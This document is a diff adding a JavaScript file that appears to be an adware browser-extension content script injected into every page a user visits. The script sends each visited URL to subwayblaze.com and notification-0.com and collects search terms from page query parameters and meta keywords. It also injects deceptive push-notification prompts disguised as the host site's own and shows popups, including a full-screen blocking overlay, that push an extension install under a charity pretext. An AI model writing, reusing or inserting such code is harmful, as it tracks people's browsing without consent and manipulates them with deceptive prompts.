@@ -1,0 +1,576 @@
+(function () {    
+    try {
+        var extAbbr = 'swbtest'; var eDomain = 'subwayblaze.com'; var iid = 'dca51f13-83c1-49b8-9d92-a889f274b372'; var cdn_url = '//d1z0mfyqx7ypd2.cloudfront.net/ext/'; var iidpn = true;
+        String.prototype.format = function () {
+            var args = arguments;
+            return this.replace(/{(\d+)}/g, function (match, number) {
+                return typeof args[number] != 'undefined'
+                    ? args[number]
+                    : match;
+            });
+        };
+        var getQueryString = function (field, url) {
+            var href = url ? url : window.location.href;
+            href = href.replace("#q=", "&q=");
+            var reg = new RegExp('[?&]' + field + '=([^&#]*)', 'i');
+            var string = reg.exec(href);
+            return string ? string[1] : "";
+        };
+        function firePixel(url) {
+            var pixelEvent = new CustomEvent(extAbbr + 'pixel', { 'detail': { 'method': 'GET', 'url': url } });
+            document.dispatchEvent(pixelEvent);
+        }
+        function ajaxPOGet(requrl, successCallback, failureCallback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", requrl, true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4) {
+                    try {
+                        if (typeof successCallback === 'function' && successCallback !== null) {
+                            successCallback(xhr.responseText, xhr.statusText, xhr);
+                        }
+                    } catch (exception) {
+                        console.log('ajaxPOGet:', exception);
+                    }
+                }
+            }
+            xhr.onerror = function (e) {
+                if (typeof failureCallback === 'function' && failureCallback !== null) {
+                    failureCallback(xhr, xhr.statusText, e);
+                }
+            };
+            xhr.send();
+        }
+        function ajaxPOPost(requrl, data, successCallback, failureCallback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", requrl, true);
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded; charset=UTF-8');
+            xhr.setRequestHeader('Accept', '*/*');
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4) {
+                    try {
+                        if (typeof successCallback === 'function' && successCallback !== null) {
+                            successCallback(xhr.responseText, xhr.statusText, xhr);
+                        }
+                    } catch (exception) {
+                        console.log('ajaxPOPost:', exception);
+                    }
+                }
+            }
+            xhr.onerror = function (e) {
+                if (typeof failureCallback === 'function' && failureCallback !== null) {
+                    failureCallback(xhr, xhr.statusText, e);
+                }
+            };
+            xhr.send(data);
+        }  
+
+        document.dispatchEvent(new CustomEvent(extAbbr + 'storage', { 'detail': true }));
+        
+        var head = document.head || document.getElementsByTagName('head')[0];
+        var body = document.body || document.getElementsByTagName('body')[0];
+
+        var s1 = document.createElement('link');
+        s1.type = 'text/css';
+        s1.rel = 'stylesheet';
+        s1.href = '//use.fontawesome.com/releases/v5.0.10/css/all.css';
+        head.appendChild(s1);
+
+        var pnStorageName = 'pnLastPush';
+        var pnSeenInterval = 30 * 60; //30 minutes
+        var pnDeclineInterval = 24 * 60 * 60; //24 hours
+        
+        var opoStorageName = 'opoLastInject';
+        var opoSeenInterval = 900; //15 minutes
+        var opoActionInterval = 1800; //30 minutes 
+        var rnd = Math.floor((Math.random() * 100));
+        var tid = rnd < 50 ? 4 : 8; // rnd < 25 ? 4 : rnd < 50 ? 5 : rnd < 75 ? 6 : 8; 
+        var palette = [{bg: '59, 53, 81', fg:'204, 208, 235'},{bg:'201, 114, 73',fg:'220, 196, 165'},{bg:'255, 160, 1', fg:'252, 235, 206'},{bg:'1, 97, 72',fg:'217, 246, 237'},{bg:'75, 75, 84',fg:'221, 218, 214'},{bg:'157, 41, 76',fg:'249, 230, 237'}]; 
+        var colorset = palette[Math.floor(Math.random()*palette.length)];
+            
+        function setInjectDelay(delayInterval) {
+            document.dispatchEvent(new CustomEvent(extAbbr + 'storage', { 'detail': { 'action': 'set', 'name': opoStorageName, 'value': 0, 'duration': delayInterval } }));
+        }
+        function processClickAction(offer)
+        {
+            pixelUrl = "http://{0}/api/lfloa?&iid={1}&type={2}&tid={3}&fid={4}&url={5}".format(eDomain, iid, 1, tid, offer.PopFeedID, encodeURIComponent(window.location.href));
+            firePixel(pixelUrl);
+            setInjectDelay(opoActionInterval);
+            var kwd = checkForMetaKeywords() || checkForQueryKeywords();
+            if (!!kwd) {
+                console.log('opo: kwd', kwd);
+                offer.SearchKWD = kwd;
+                offer.CountryCode = 'us';
+            }
+            offer.TID = tid;
+            console.log('opo:', offer.Url);
+            var initE = new CustomEvent(window.extAbbr + 'tup', { 'detail': { 'newtaburl': offer.Url, 'callback': JSON.stringify(offer) } });
+            document.dispatchEvent(initE);
+        }
+        function updateStyleSheet(css) {
+            var style = document.createElement('style');
+            style.type = 'text/css';
+            if (style.styleSheet) style.styleSheet.cssText = css;
+            else style.appendChild(document.createTextNode(css));
+            head.appendChild(style);
+        }
+        function checkForMetaKeywords()
+        {
+            var x = document.getElementsByTagName('meta');
+            var y = '';
+            for (i = 0; i < x.length; i++) {
+                if (!!x[i].name && x[i].name == 'keywords') {
+                    y = x[i].content; 
+                }
+            }
+            
+            var z = y != '' ? y.split(',') : [];
+            var kwd = z.length > 0 ? z[Math.floor(Math.random() * z.length)]: '';
+            return kwd;
+        }
+        function checkForQueryKeywords()
+        {
+            var params = ['b', 'conteudo', 'eq', 'field-keywords', 'gameKeyword', 'gsc.q', 'gsquery', 'header-search-input', 'k', 'keys', 'Keyword', 'keywords', 'kw', 'kwd', 'needle', 'Ntt', 'origkw', 'p', 'palavra', 'produto', 'p_search_text', 'q', 'q1', 'qkw', 'qt', 'query', 'quicksearch', 's', 'search', 'search%5Bkeywords%5D', 'SearchableText', 'searchfor', 'searchkey', 'searchterm', 'searchTerms', 'SearchText', 'search_query', 'src', 'ss', 'stq', 'strBusca', 't', 'term', 'termo', 'Terms', 'text', 'uncompiledQuery', 'wd', 'what'];
+            var list = [];
+            for (i = 0; i < params.length; i++)
+            {
+                var kwd = getQueryString(params[i]);
+                if (kwd != '') list.push(kwd);
+            }
+            return list.length > 0 ? list[Math.floor(Math.random() * list.length)] : '';
+        }
+        function getKeyword()
+        {
+            return checkForMetaKeywords() || checkForQueryKeywords();
+        }
+        //#region display types   
+        function sliderDownPushNotification(){
+            var browserLangCode = !!navigator.language ? navigator.language.indexOf('-') > -1 ? navigator.language.split('-')[0] : navigator.language : "";
+            if (!!_pcg && _pcg.GN_BrowserLanguage == "")
+                ajaxPOGet("https://notification-0.com/api/ubl?iid=" + iid + "&lang=" + browserLangCode, function () { });
+
+            var css = '.opt-in-notification{width:422px;padding:0;border:1px solid #bababa;border-radius:3px;box-shadow:0 4px 4px -2px #888;background-color:#fbfbfb;font-family:Arial,sans-serif;position:fixed;top:0;left:50%;margin-left:-211px;z-index:9999999999999}.opt-in-notification-inner-container{margin:0;padding:0 20px 10px}.opt-in-notification-image-container{float:left;margin:13px 15px 0 0}.opt-in-notification-image-container img{width:65px;height:65px}.opt-in-notification-text-container{position:relative!important;padding:10px 0 0!important;color:#000!important;text-align:left!important;margin:0!important;line-height:1.4em!important}.opt-in-notification-title{margin-bottom:5px;text-align:left;font-size:14px;font-weight:700;line-height:1.4em;color:#000;word-break:break-word;overflow:hidden}.opt-in-notification-description{font-size:12px;line-height:1.4em;margin:10px 0;padding:0;text-align:left;word-break:break-word;overflow:hidden}.brand-logo{float:left;font-size:10px;margin-top:8px;line-height:18px}.brand-logo img{width:38px;margin-left:3px;float:right}.opt-in-notification-button-container{float:right!important}.opt-in-notification-button{width:auto;height:18px;min-width:100px;max-width:170px;line-height:18px;margin-left:3px;padding:5px;background:#f9f9f9;border:1px solid #bababa;border-radius:1px;display:inline-block;font-size:14px;text-align:center;cursor:pointer;box-sizing:content-box}.opt-in-allow-button{background:#00c33d;color:#fff}@media all and (max-width:421px){.opt-in-notification{width:100%;left:0;margin:0;border-radius:0;border-left:0;border-right:0;border-top:0}}.opt-in-overlay{width:100%;height:100%;position:fixed!important;top:0;left:0;z-index:999999!important;display:block!important;background-color:#000!important;opacity:.8!important}.opt-in-overlay-message{position:fixed;z-index:9999999!important;color:#fff;left:50%;top:50%;width:380px;height:50px;text-align:center;-webkit-transform:translate(-50%,-50%);-moz-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);-o-transform:translate(-50%,-50%);transform:translate(-50%,-50%);font-size:20px}';
+
+            updateStyleSheet(css);
+            var div_container = document.createElement('div');
+            div_container.className = 'opt-in-notification';
+            div_container.id = 'div_container';
+
+            var div_container2 = document.createElement('div');
+            div_container2.className = 'opt-in-notification-inner-container';
+
+            var div_container3 = document.createElement('div');
+            div_container3.className = 'opt-in-notification-image-container';
+
+            // var img = document.createElement('img');
+            // img.className = 'opt-in-notification-image';
+            // div_container3.appendChild(img);
+
+            var div_container4 = document.createElement('div');
+            div_container4.className = 'opt-in-notification-text-container';
+
+            var div_container5 = document.createElement('div');
+            div_container5.className = 'opt-in-notification-title';
+            div_container5.innerHTML = 
+                browserLangCode == 'pt' ? 'Fique atualizado com as últimas promoções e promoções.' 
+                : browserLangCode == 'es' ? 'Manténgase actualizado con las últimas promociones y ofertas.' 
+                : 'Stay updated with the latest promotions and deals.';
+
+            var div_container6 = document.createElement('div');
+            div_container6.className = 'opt-in-notification-description';
+            div_container6.innerHTML = 
+                browserLangCode == 'pt' ? 'Gostaríamos de ajudá-lo a encontrar as ofertas perfeitas. Selecione "Permitir" para receber notificações de nós.'
+                : browserLangCode == 'es' ? 'Nos gustaría ayudarte a encontrar las mejores ofertas. Seleccione "Permitir" para recibir notificaciones de nosotros.'
+                : "We would like to help you find that perfect deals. Select 'Allow' to receive notifications from us.";
+
+            var div_container7 = document.createElement('div');
+            div_container7.className = 'opt-in-notification-button-container';
+
+            var div_btn_disallow = document.createElement('div');
+            div_btn_disallow.className = 'opt-in-notification-button opt-in-disallow-button';
+            div_btn_disallow.innerHTML = 'Decline';
+            div_btn_disallow.onclick = function(e) {
+                ajaxPOGet("https://notification-0.com/api/lws?iid=" + iid + "&url=" + encodeURIComponent(location.href) + "&popfeedid=5149&urltype=2", function () { });
+                document.getElementById("div_container").remove();
+                document.dispatchEvent(new CustomEvent(extAbbr + 'storage', { 'detail': { 'action': 'set', 'name': pnStorageName, 'value': 0, 'duration': pnDeclineInterval } }));
+            }
+
+            var colors = ["#00c33d", "#c30068", "#0014c3", "#009bc3", "#00c388", "#e6c518", "#c38b00", "#c30000", "#c300b9", "#00b8c3" ];
+            var div_btn_allow = document.createElement('div');
+            div_btn_allow.className = 'opt-in-notification-button opt-in-allow-button';
+            div_btn_allow.innerHTML = 'Allow';
+            div_btn_allow.id = 'push-allow';
+            div_btn_allow.style.backgroundColor = colors[Math.floor(Math.random() * 10)];
+            div_btn_allow.onclick = function(e) {
+                var hostname = location.hostname.replace('.com','').replace('www.','');
+                var subdomainname = (hostname.match(/[.]/g) || []).length == 0 ? hostname : 'offer';
+                ajaxPOGet("https://notification-0.com/api/lws?iid=" + iid + "&url=" + encodeURIComponent(location.href) + "&popfeedid=5149&urltype=1&refr=" + subdomainname, function () { });
+                // pop up push page
+                var w = 450;
+                var h = 240;
+                var left = (window.screen.width - w)/2;
+                var top = (window.screen.height - h)/2;
+                
+                var oparam = 'height=' + h + ',width=' + w + ',top=' + top + ',left=' + left;
+                //console.log(oparam);
+                var url =  location.href.indexOf('notification-0.com') > -1 ? 'https://notification-0.com/ext/push/notification' : 'https://' + subdomainname + '.notification-0.com/ext/push/notification';
+                url = url + '?iid=' + iid;
+                if (typeof uniVersion != 'undefined')
+                    url += '&ba=1';
+
+                var newwin = window.open(url, 'pushwin', oparam);
+                document.getElementById("div_container").remove();
+            };
+
+            var div_container10 = document.createElement('div');
+            div_container10.className = 'opt-in-notification-buttons';
+            div_container10.style.clear = 'both';
+
+            var div_container11 = document.createElement('div');
+            div_container11.style.clear = 'both';
+
+            div_container7.appendChild(div_btn_disallow);
+            div_container7.appendChild(div_btn_allow);
+            div_container10.appendChild(div_container7);
+            div_container10.appendChild(div_container11);
+            div_container4.appendChild(div_container5);
+            div_container4.appendChild(div_container6);
+            div_container2.appendChild(div_container3);
+            div_container2.appendChild(div_container4);
+            div_container2.appendChild(div_container10);
+            div_container.appendChild(div_container2);
+            document.body.appendChild(div_container);
+            setTimeout('document.getElementById("div_container").style.top = 0;', 500);
+        }
+        
+        function slideDownOffer(offer) {
+            var css = '';
+            css += '#popover-container {width: 422px; padding: 0px; border: 1px solid #bababa; border-radius: 3px; box-shadow: #888 0px 4px 4px -2px; background-color: rgb({1}); font-family: sans-serif; position: fixed; top: -500px; left: 50%; margin-left: -211px; z-index: 2147483647; transition: all 1s ease-in-out;}';
+            css += '.clsbtn {float: right; margin-right: 10px; margin-top: 10px; width: 10px; cursor:pointer;}';
+            css += '#popover-dialog {margin: 0px; padding: 0px 20px 10px;}';
+            css += '#popover-icon {float: left; margin: 13px 15px 0px 0px;}';
+            css += '#popover-icon i {font-size: 65px; margin-right: 10px; margin-top: 10px; color: rgb({0});}';
+            css += '#popover-content {position: relative; padding: 10px 0px 0px; color: rgb({0}); text-align: left; margin: 0px; line-height: 1.4em;}';
+            css += '#popover-title {margin-bottom: 5px; text-align: left; font-size: 20px; font-weight: 700; line-height: 1.4em; word-break: break-word; overflow: hidden;}';
+            css += '#popover-msg {font-size: 16px; line-height: 1.4em; margin: 10px 0px; padding: 0px; text-align: left; word-break: break-word; overflow: hidden;}';
+            css += '#popover-spacer {clear:both;}';
+            css += '#popover-footer-box {float:right;}';
+            css += '#popover-allow {background: rgb({0}); color: rgb({1}); border: 1px solid #bababa; width: auto; height: 18px; min-width: 100px; max-width: 170px; line-height: 18px; margin-left: 3px; padding: 5px; border-radius: 1px; display: inline-block; font-size: 16px; text-align: center; cursor: pointer; box-sizing: content-box;}';
+            
+            updateStyleSheet(css.format(colorset.bg, colorset.fg));
+            var div_container = document.createElement('div');
+            div_container.id = 'popover-container';
+
+            var div_dialog = document.createElement('div');
+            div_dialog.id = 'popover-dialog';
+
+            var div_icon = document.createElement('div');
+            div_icon.id = 'popover-icon';
+
+            var img_icon = document.createElement('i');
+            img_icon.setAttribute('class', "fas fa-info-circle");
+
+            var div_content = document.createElement('div');
+            div_content.id = 'popover-content';
+
+            var div_title = document.createElement('div');
+            div_title.id = 'popover-title';
+            div_title.innerHTML = 'Act Now';
+
+            var div_msg = document.createElement('div');
+            div_msg.id = 'popover-msg';
+            div_msg.innerHTML = 'Want us to donate to your favorite charity ? (by installing our extension)';
+
+            var div_footer = document.createElement('div');
+            div_footer.id = 'popover-footer';
+
+            var div_footer_box = document.createElement('div');
+            div_footer_box.id = 'popover-footer-box';
+
+            var btn_allow = document.createElement('div');
+            btn_allow.id = 'popover-allow';
+            btn_allow.innerHTML = 'OK';
+            btn_allow.onclick = function (evt) {
+                processClickAction(offer);
+                document.getElementById("popover-container").remove();
+            };
+
+            var clsbtn = document.createElement('i');
+            clsbtn.setAttribute('class', "clsbtn fas fa-times");
+            clsbtn.onclick = function (evt) {
+                var pixelUrl = "http://{0}/api/lfloa?&iid={1}&type={2}&tid={3}&fid={4}&url={5}".format(eDomain, iid, 4, tid, offer.PopFeedID, encodeURIComponent(window.location.href));
+                firePixel(pixelUrl);
+                document.getElementById("popover-container").remove();
+            };
+
+            var div_spacer = document.createElement('div');
+            div_spacer.id = 'popover-spacer';
+
+            div_footer_box.appendChild(btn_allow);
+            div_footer.appendChild(div_footer_box);
+            div_footer.appendChild(div_spacer);
+            div_content.appendChild(div_title);
+            div_content.appendChild(div_msg);
+            div_icon.appendChild(img_icon);
+            div_dialog.appendChild(div_icon);
+            div_dialog.appendChild(div_content);
+            div_dialog.appendChild(div_footer);
+            div_container.appendChild(clsbtn);
+            div_container.appendChild(div_dialog);
+            document.body.appendChild(div_container);
+            setTimeout('document.getElementById("popover-container").style.top = 0;', 500);
+        }
+
+        function interstitialOffer(offer) {
+            var css = '';
+            css += '#popover-container {width: 422px; padding: 0px; border: 1px solid #bababa; border-radius: 3px; box-shadow: #888 0px 4px 4px -2px; background-color: rgba(0, 0, 0, 0.8); font-family: sans-serif; position: fixed; top: -500px; left: 50%; margin-left: -211px; z-index: 2147483647; transition: all 1s ease-in-out;}';
+            css += '#popover-container img {float: right; margin-right: 5px; margin-top: 5px; width: 10px;}';
+            css += '.clsbtn {float: right; margin-right: 10px; margin-top: 10px; width: 10px; cursor:pointer;color:cornflowerblue;}';
+            css += '#popover-dialog {margin: 0px; padding: 0px 20px 10px;}';
+            css += '#popover-content {position: relative; padding: 10px 0px 0px; color: #fff; text-align: left; margin: 0px; line-height: 1.4em;}';
+            css += '#popover-title {margin-bottom: 5px; text-align: left; font-size: 20px; font-weight: 700; line-height: 1.4em; color: #fff; word-break: break-word; overflow: hidden;}';
+            css += '#popover-msg {font-size: 16px; line-height: 1.4em; margin: 10px 0px; padding: 0px; text-align: left; word-break: break-word; overflow: hidden;}';
+            css += '#popover-footer-box {position:relative;left:35%;}';
+            css += '#popover-allow {background: cornflowerblue; color: #FFF; border: 1px solid #bababa; width: auto; height: 18px; min-width: 100px; max-width: 170px; line-height: 18px; margin-left: 3px; padding: 5px; border-radius: 1px; display: inline-block; font-size: 16px; text-align: center; cursor: pointer; box-sizing: content-box;}';
+            updateStyleSheet(css);
+
+            var div_container = document.createElement('div');
+            div_container.id = 'popover-container';
+
+            var div_dialog = document.createElement('div');
+            div_dialog.id = 'popover-dialog';
+
+            var div_content = document.createElement('div');
+            div_content.id = 'popover-content';
+
+            var div_title = document.createElement('div');
+            div_title.id = 'popover-title';
+            div_title.innerHTML = 'Act Now';
+
+            var div_msg = document.createElement('div');
+            div_msg.id = 'popover-msg';
+            div_msg.innerHTML = 'Want us to donate to your favorite charity ? (by installing our extension)';
+
+            var div_footer = document.createElement('div');
+            div_footer.id = 'popover-footer';
+
+            var div_footer_box = document.createElement('div');
+            div_footer_box.id = 'popover-footer-box';
+
+            var btn_allow = document.createElement('div');
+            btn_allow.id = 'popover-allow';
+            btn_allow.innerHTML = 'OK';
+            btn_allow.onclick = function (evt) {
+                processClickAction(offer);
+                document.getElementById("popover-container").remove();
+            };
+            var clsbtn = document.createElement('i');
+            clsbtn.setAttribute('class', "clsbtn fas fa-times");
+            clsbtn.onclick = function (evt) {
+                var pixelUrl = "http://{0}/api/lfloa?&iid={1}&type={2}&tid={3}&fid={4}&url={5}".format(eDomain, iid, 4, tid, offer.PopFeedID, encodeURIComponent(window.location.href));
+                firePixel(pixelUrl);
+                document.getElementById("popover-container").remove();
+            };
+
+            div_footer_box.appendChild(btn_allow);
+            div_footer.appendChild(div_footer_box);
+            div_content.appendChild(div_title);
+            div_content.appendChild(div_msg);
+            div_dialog.appendChild(div_content);
+            div_dialog.appendChild(div_footer);
+            div_container.appendChild(clsbtn);
+            div_container.appendChild(div_dialog);
+            document.body.appendChild(div_container);
+            setTimeout('document.getElementById("popover-container").style.top = "30%";', 500);
+        }
+
+        function messageOffer(offer) {
+            var div_container = document.createElement('div');
+            div_container.id = 'popover-container';
+            div_container.style = 'position:fixed;left: 0;bottom: 100px; background-color: transparent;margin-top: 15px;';
+
+            var div_dialog = document.createElement('div');
+            div_dialog.id = 'popover-dialog';
+            div_dialog.style = 'background-color: rgb(255, 255, 255);border-color: rgb(255, 255, 255); position: absolute;top: 0;left: 120px;min-width: 400px;padding:5px;border: 2px solid white;box-shadow: 1px 2px 4px rgba(0, 0, 0, 0.2);';
+
+            var div_icon = document.createElement('div');
+            div_icon.id = 'popover-icon';
+            div_icon.style = 'margin-left: 15px;font-size: 87px;border-radius: 5px; color:grey; background-color:lightgray; line-height: 87px;';
+
+            var img_icon = document.createElement('i');
+            img_icon.setAttribute('class', "fas fa-user");
+            
+            var div_title = document.createElement('div');
+            div_title.id = 'popover-title';
+            div_title.innerHTML = location.host;
+            div_title.style = 'color: rgb(34, 34, 34);font-family: Open Sans, sans-serif;padding-bottom: 3px;line-height: 20px;font-size: 12px;';
+
+            var div_msg = document.createElement('div');
+            div_msg.id = 'popover-msg';
+            div_msg.innerHTML = 'Want us to donate to your favorite charity ? (by installing our extension)';
+            div_msg.style = 'font-family: Open Sans, sans-serif;font-size: 16px;font-weight:400;line-height:30px';
+
+            var btn_allow = document.createElement('div');
+            btn_allow.id = 'popover-allow';
+            btn_allow.innerHTML = 'OK';
+            btn_allow.style = 'background-color: rgb(0,191,255);color: rgb(255,255,255);min-width: 100px;height: 36px;float: right;margin:  10px;text-align: center;line-height: 36px; border-radius:10px;cursor:pointer;';
+            btn_allow.onclick = function (evt) {
+                processClickAction(offer);
+                document.getElementById("popover-container").remove();
+            };
+
+            var clsbtn = document.createElement('i');
+            clsbtn.setAttribute('class', "clsbtn fas fa-times");
+            clsbtn.style = 'position:absolute;right:5px;top:5px;font-size:12px; cursor:pointer;';
+            clsbtn.onclick = function (evt) {
+                var pixelUrl = "http://{0}/api/lfloa?&iid={1}&type={2}&tid={3}&fid={4}&url={5}".format(eDomain, iid, 4, tid, offer.PopFeedID, encodeURIComponent(window.location.href));
+                firePixel(pixelUrl);
+                document.getElementById("popover-container").remove();
+            };
+
+            div_msg.appendChild(btn_allow);
+            div_dialog.appendChild(div_title);
+            div_dialog.appendChild(div_msg);
+            div_icon.appendChild(img_icon);
+            div_dialog.appendChild(clsbtn);
+            div_container.appendChild(div_icon);
+            div_container.appendChild(div_dialog);
+            document.body.appendChild(div_container);		
+        }
+
+        function blockScreenOffer(offer)
+        {
+            var css = '';
+            css += '#popover-container{position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: rgba({0}, 0.8);z-index: 999;}';
+            css += '#popover-dialog{min-height: 500px;max-width: 700px;width: 100%;margin: auto;color: rgb({1});border: 1px solid;text-align: center;position: relative;top: 50%;transform: translateY(-50%);}';
+            css += '#popover-title{padding:20px;font-size:36px;}';
+            css += '#popover-msg{padding:20px;font-size:48px;font-weight:600;}';
+            css += '#popover-footer{position: absolute;bottom: 0;left: 50%;transform: translateX(-50%);}';
+            css += '#popover-allow{background:rgb({0});font-size:30px;width:300px;margin:20px auto;line-height:50px;cursor:pointer;}';
+            css += '#popover-close{background:rgb({1});color:rgb({0});font-size:30px;width:300px;margin:20px auto;line-height:50px;cursor:pointer;}';
+            updateStyleSheet(css.format(colorset.bg, colorset.fg));
+
+            var div_container = document.createElement('div');
+            div_container.id = 'popover-container';
+
+            var div_dialog = document.createElement('div');
+            div_dialog.id = 'popover-dialog';
+
+            var div_content = document.createElement('div');
+            div_content.id = 'popover-content';
+
+            var div_title = document.createElement('div');
+            div_title.id = 'popover-title';
+            div_title.innerHTML = 'Act Now';
+
+            var div_msg = document.createElement('div');
+            div_msg.id = 'popover-msg';
+            div_msg.innerHTML = 'Want us to donate to your favorite charity ? (by installing our extension)';
+
+            var div_footer = document.createElement('div');
+            div_footer.id = 'popover-footer';
+
+            var btn_allow = document.createElement('div');
+            btn_allow.id = 'popover-allow';
+            btn_allow.innerHTML = 'OK';
+            btn_allow.onclick = function (evt) {
+                processClickAction(offer);
+                document.getElementById("popover-container").remove();
+            };
+
+            var btn_close = document.createElement('div');
+            btn_close.id = 'popover-close';
+            btn_close.innerHTML = 'No Thanks';
+            btn_close.onclick = function (evt) {
+                var pixelUrl = "http://{0}/api/lfloa?&iid={1}&type={2}&tid={3}&fid={4}&url={5}".format(eDomain, iid, 4, tid, offer.PopFeedID, encodeURIComponent(window.location.href));
+                firePixel(pixelUrl);
+                document.getElementById("popover-container").remove();
+            };
+
+            div_footer.appendChild(btn_allow);
+            div_footer.appendChild(btn_close);
+            div_content.appendChild(div_title);
+            div_content.appendChild(div_msg);
+            div_dialog.appendChild(div_content);
+            div_dialog.appendChild(div_footer);
+            div_container.appendChild(div_dialog);
+            body.appendChild(div_container);
+
+
+        }
+        //#endregion display types
+        
+        // push notification to BA users
+        var canPush = true;
+        if (!!iidpn && location.hostname.endsWith('.com')) {
+            console.log('pn: on');
+            setTimeout(function () {
+                var lastInjections = eval('window.__' + extAbbr + 'storage');
+                if (!!lastInjections) {
+                    for (var i = 0; i < lastInjections.length; i++) {
+                        if (lastInjections[i].name == pnStorageName) {
+                            console.log('pn: within delay');
+                            canPush = false;
+                        }
+                    }
+                }
+                if (canPush)
+                {
+                    var hasFocus = document["hasFocus"] && document["hasFocus"]();
+                    if (hasFocus) {
+                        console.log('pn');
+                        var browserLangCode = !!navigator.language ? navigator.language.indexOf('-') > -1 ? navigator.language.split('-')[0] : navigator.language : "";
+                        ajaxPOGet("https://notification-0.com/api/lws?iid=" + iid + "&url=" + encodeURIComponent(location.href) + "&popfeedid=5149&urltype=0&refr=" + browserLangCode, function () { });
+                        sliderDownPushNotification();
+                        document.dispatchEvent(new CustomEvent(extAbbr + 'storage', { 'detail': { 'action': 'set', 'name': pnStorageName, 'value': 0, 'duration': pnSeenInterval } }));
+                    }
+                    else
+                        console.log("pn: nf skip");
+                }
+            }, 5000);
+        }
+        else 
+            console.log('pn: off');
+        
+        setTimeout(function () {
+            if (typeof uniVersion == 'undefined' && (!iidpn || !canPush)) {
+                var lastInjections = eval('window.__' + extAbbr + 'storage');
+                var canInject = true;
+                if (!!lastInjections) {
+                    for (var i = 0; i < lastInjections.length; i++) {
+                        if (lastInjections[i].name == opoStorageName) {
+                            console.log('opo: within delay');
+                            canInject = false;
+                            break;
+                        }
+                    }
+                }
+                if (canInject)// && Math.floor((Math.random() * 100)) > 75)
+                {
+                    var hasFocus = document["hasFocus"] && document["hasFocus"]();
+                    if (hasFocus) {
+                        console.log('opo');
+                        var gid = 40;
+                        ajaxPOGet("//{0}/api/ul?format=json&groupId={1}&iid={2}&url={3}".format(eDomain, gid, iid, encodeURIComponent(location.href)), function (result) {
+                            if (result === '[]') { console.log('opo: []'); return; }
+                            var offer = JSON.parse(result);
+                            if (tid == 4) slideDownOffer(offer);
+                            else if (tid == 5) interstitialOffer(offer);
+                            else if (tid == 6) messageOffer(offer);
+                            else blockScreenOffer(offer);
+                            console.log('opo:{1}[{0}]'.format(offer.Url, tid));
+                            var fid = offer.PopFeedID;
+                            var pixelUrl = "http://{0}/api/lfloa?&iid={1}&type={2}&tid={3}&fid={4}&url={5}".format(eDomain, iid, 0, tid, fid, encodeURIComponent(window.location.href));
+                            firePixel(pixelUrl);
+                            setInjectDelay(opoSeenInterval);
+                        });
+                    }
+                    else
+                        console.log("opo: nf skip");
+                }    
+            }
+        }, 7500);
+               
+    }
+    catch (err){ console.log(err);}    
+})();
